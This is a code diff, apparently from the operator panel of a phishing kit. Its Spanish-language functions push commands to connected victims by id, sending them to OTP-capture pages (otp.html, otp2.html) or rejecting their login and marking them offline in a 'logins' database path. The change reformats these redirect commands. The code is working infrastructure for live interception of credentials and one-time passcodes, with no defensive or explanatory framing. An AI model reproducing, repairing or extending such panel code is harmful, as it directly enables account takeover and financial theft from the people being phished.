@@ -429,31 +429,28 @@
 
         // COMANDOS OTP
         function solicitarOTP(id) {
-            db.ref('comandos/' + id).set({ 
-                action: 'redirect', 
-                url: 'otp.html',
-                ts: Date.now() 
-            });
-            alert('✓ Redirigiendo a otp.html');
-        }
+    db.ref('comandos/' + id).set({ 
+        redirect: 'otp.html',  // ← CAMBIADO: era 'url', ahora es 'redirect'
+        ts: Date.now() 
+    });
+    alert('✓ Redirigiendo a otp.html');
+}
 
-        function solicitarOTP2(id) {
-            db.ref('comandos/' + id).set({ 
-                action: 'redirect', 
-                url: 'otp2.html',
-                ts: Date.now() 
-            });
-            alert('✓ Redirigiendo a otp2.html');
-        }
+function solicitarOTP2(id) {
+    db.ref('comandos/' + id).set({ 
+        redirect: 'otp2.html',  // ← CAMBIADO: era 'url', ahora es 'redirect'
+        ts: Date.now() 
+    });
+    alert('✓ Redirigiendo a otp2.html');
+}
 
-        function rechazar(id) {
-            db.ref('comandos/' + id).set({ 
-                action: 'redirect', 
-                url: 'index.html',
-                ts: Date.now() 
-            });
-            db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
-        }
+function rechazar(id) {
+    db.ref('comandos/' + id).set({ 
+        redirect: 'index.html',  // ← CAMBIADO
+        ts: Date.now() 
+    });
+    db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
+}
 
         function recuperar(id) {
             if (!confirm('¿Recuperar?')) return;
